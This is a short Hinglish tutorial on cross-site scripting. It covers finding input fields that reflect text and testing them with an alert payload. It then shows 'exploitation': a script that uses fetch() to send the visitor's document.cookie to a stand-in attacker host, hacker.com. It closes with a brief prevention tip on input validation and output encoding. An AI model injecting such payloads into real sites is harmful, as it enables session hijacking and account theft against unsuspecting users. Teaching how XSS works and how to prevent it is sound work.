Step 1: Finding Entry Points

Website par search bars, comment box, ya contact forms dhunde. Wahan koi normal text (jaise "Owlguard") likh kar enter karein aur dekhein ki wo page par kahan display ho raha hai.

Logic: Agar website aapke input ko bina "sanitize" (saaf) kiye screen par dikha rahi hai, toh wo XSS ke liye vulnerable hai.

Step 2: Testing Vulnerability

Ab normal text ki jagah basic payload daalein:
<script>alert('Vulnerable')</script>

Agar browser mein "Vulnerable" ka popup aata hai, toh aapne darwaza dhund liya hai.

Step 3: Exploitation (Stealing Cookies)

Real attack mein hum alert nahi dikhate, balki user ki cookies churate hain. Hacker ek script inject karta hai jo cookies hacker ke server par bhej deti hai.

<script>fetch('http://hacker.com/log?c=' + document.cookie);</script>

Prevention Tip

XSS se bachne ke liye hamesha Input Validation aur Output Encoding ka use karein. Kabhi bhi user ke input ko raw HTML mein print na karein.
